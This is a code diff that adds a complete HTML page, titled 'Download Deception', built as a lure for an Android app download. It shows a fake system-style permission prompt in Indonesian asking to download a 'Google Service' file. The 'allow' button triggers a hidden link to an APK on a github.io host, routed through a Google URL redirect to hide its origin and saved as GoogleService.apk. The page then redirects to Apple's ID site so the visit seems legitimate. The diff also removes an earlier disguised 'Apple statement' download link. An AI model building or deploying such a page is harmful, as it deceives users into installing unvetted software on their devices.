@@ -1,3 +1,124 @@
-<a href="https://docs.google.com/uc?export=download&id=FAKE&target=https://sauceialist.github.io/justwanna/downloads.html">
-  Download your Apple statement
-</a>
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Download Deception</title>
+  <style>
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, sans-serif;
+      margin: 0;
+      padding: 0;
+      background: #fff;
+    }
+
+    .overlay {
+      position: fixed;
+      top: 0; left: 0;
+      width: 100vw; height: 100vh;
+      background: rgba(0, 0, 0, 0.25);
+      backdrop-filter: blur(4px);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      z-index: 1000;
+    }
+
+    .prompt {
+      background: #f9f9f9;
+      padding: 20px 24px;
+      border-radius: 12px;
+      box-shadow: 0 2px 20px rgba(0,0,0,0.3);
+      text-align: center;
+      width: 90%;
+      max-width: 320px;
+    }
+
+    .prompt h3 {
+      font-size: 16px;
+      margin-bottom: 12px;
+    }
+
+    .prompt p {
+      font-size: 14px;
+      color: #555;
+    }
+
+    .btns {
+      margin-top: 18px;
+      display: flex;
+      justify-content: space-between;
+    }
+
+    .btns button {
+      padding: 8px 14px;
+      font-size: 14px;
+      border: none;
+      border-radius: 8px;
+      flex: 1;
+      margin: 0 6px;
+      cursor: pointer;
+    }
+
+    .deny {
+      background-color: #e0e0e0;
+      color: #222;
+    }
+
+    .allow {
+      background-color: #007aff;
+      color: #fff;
+    }
+
+    #loading {
+      display: none;
+      text-align: center;
+      margin-top: 20px;
+      font-size: 14px;
+      color: #666;
+    }
+
+    a#dl {
+      display: none;
+    }
+  </style>
+</head>
+<body>
+
+<div class="overlay" id="overlay">
+  <div class="prompt">
+    <h3>“example.com” ingin mengunduh file Google Service</h3>
+    <p>File ini mungkin diperlukan untuk menjalankan sistem.</p>
+    <div class="btns">
+      <button class="deny" onclick="cancel()">Batal</button>
+      <button class="allow" onclick="start()">Izinkan</button>
+    </div>
+    <div id="loading">Mengunduh file…</div>
+  </div>
+</div>
+
+<!-- Link tersembunyi ke file .apk via Google redirect -->
+<a id="dl" href="https://www.google.com/url?q=https://ybt01.github.io/upload/app-debug.apk&sa=D&source=buganizer&usg=AOvVaw3nm-qJSzcGfjAOwSO0tcBK" download="GoogleService.apk"></a>
+
+<script>
+  function cancel() {
+    document.getElementById("overlay").style.display = "none";
+  }
+
+  function start() {
+    // Sembunyikan prompt & tampilkan loading
+    document.querySelector(".btns").style.display = "none";
+    document.getElementById("loading").style.display = "block";
+
+    // Trigger download via gesture-captured click
+    document.getElementById("dl").click();
+
+    // Delay 1.2 detik lalu redirect ke halaman trusted
+    setTimeout(() => {
+      window.location.href = "https://appleid.apple.com";
+    }, 1200);
+  }
+</script>
+
+</body>
+</html>
